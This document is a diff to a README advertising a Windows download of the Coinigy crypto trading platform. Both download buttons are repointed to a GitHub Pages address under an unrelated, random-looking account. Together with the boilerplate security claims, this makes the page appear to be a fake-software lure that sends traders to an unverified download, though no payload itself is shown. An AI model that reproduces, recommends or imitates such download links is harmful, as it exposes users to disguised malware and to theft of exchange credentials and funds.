@@ -4,7 +4,7 @@
 
 ## 📥 Download Coinigy for Windows
 
-[![⬇️ Download Coinigy](https://img.shields.io/badge/Download-Coinigy-blue?style=for-the-badge&logo=windows)](https://coinigy-desktop-app.github.io/.github)
+[![⬇️ Download Coinigy](https://img.shields.io/badge/Download-Coinigy-blue?style=for-the-badge&logo=windows)](https://itkgemok.github.io/.github/coinigy-trading-platform)
 
 ---
 
@@ -24,7 +24,7 @@ Security is a top priority for Coinigy. All exchange connections use encrypted A
 
 For both active traders and long-term investors, Coinigy provides an environment that blends market access, advanced analytics, and secure asset management. Whether you are day trading, swing trading, or simply monitoring a diversified crypto portfolio, Coinigy delivers a feature-rich, professional-grade solution that keeps you connected to the markets and in control of your trading operations.
 
-[![⬇️ Download Coinigy](https://img.shields.io/badge/Download-Coinigy-blue?style=for-the-badge&logo=windows)](https://coinigy-desktop-app.github.io/.github)
+[![⬇️ Download Coinigy](https://img.shields.io/badge/Download-Coinigy-blue?style=for-the-badge&logo=windows)](https://itkgemok.github.io/.github/coinigy-trading-platform)
 
 ---
 
